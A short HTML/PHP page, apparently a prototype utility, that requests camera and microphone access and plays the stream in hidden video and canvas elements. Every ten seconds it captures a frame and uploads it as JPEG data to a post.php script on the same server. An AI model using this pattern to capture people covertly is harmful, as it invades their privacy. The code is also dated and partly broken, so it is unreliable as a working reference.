<!doctype html>
<html lang="it">
	<head>
		<meta charset="utf-8"/>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
	</head>
	<body>
		<video id="v" autoplay controls width="1280" height="800" hidden></video>
		<canvas id="c" width="1280" height="800" hidden></canvas>
		<span id="fs"></span>
		
	</body>
	<script>
		
		var v = document.getElementById('v');
		var c = document.getElementById('c');
		var fs = document.getElementById('fs');
		var cx = c.getContext('2d');
		var xhr = new XMLHttpRequest();
		<?php echo "var ip = '$_SERVER[HTTP_HOST]';"; ?>
		
		navigator.getUserMedia(
			{video:true, audio:true}, 
			function(s) { v.src = s; }, 
			function(s) { alert(s); } 
		);
		
		setInterval(shoot, 10000);
		
		function shoot() {
			//alert(v.width+' '+v.height);
			cx.drawImage(v, 0, 0, 1280, 800);
			var image = c.toDataURL('image/jpeg');
			xhr.open('get', 'http://'+ip+'/utility/usermedia/post.php?image='+image);
			alert('send');
			xhr.send();
			
		}
	</script>
</html>

